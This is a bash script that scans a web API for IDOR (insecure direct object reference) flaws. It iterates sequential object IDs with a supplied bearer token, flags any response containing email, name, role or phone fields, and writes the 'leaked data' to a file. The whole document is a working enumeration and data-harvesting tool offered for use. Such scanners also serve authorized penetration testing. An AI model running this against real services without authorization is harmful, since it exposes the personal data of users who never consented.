


#!/bin/bash

read -p "enter a base_url :: " base_url
read -p "enter a ID range :: " t_id


read -p "enter a token :: " base_token

acc_idor(){
    local url=$1


    local id=$2
    local token=$3



    count=1

> vulnerable_ids.txt

    while (( count <= id )); do

       target="${url}/${count}"
        response=$(curl -s -X GET -H "Authorization: Bearer $token" -H "Content-Type: application/json" -w "\n%{http_code}" "${target}")


          status=$(echo "$response" | tail -n1)
  body=$(echo "$response" | head -n -1)


if [ "$status" -eq 200 ]; then


if echo "$response" | grep -qiE "error|not found|unauthorized|false"; then

   echo " $count satus is 200 ok but error/found"

 elif echo "$response" | grep -qiE "email|name|role|phone"; then
        echo " Idor possible in $target"

echo "------_----------"
echo "leaked data .. $body"

echo "$body" >> vulnerable_ids.txt

else
   echo "no sensitive data leaking.."
   echo "$response"
fi

elif [[ "$status" -eq 403 || "$status" -eq 401 ]]; then

echo " acess denied ...your not authorized"

elif [ "$status" -eq 404 ]; then

echo " $target :: Not found status : $status"

else

   echo "$target :: status :: $status "


fi
        count=$((count + 1))

    done



}



acc_idor "$base_url" "$t_id" "$base_token" | tee scan_results.txt
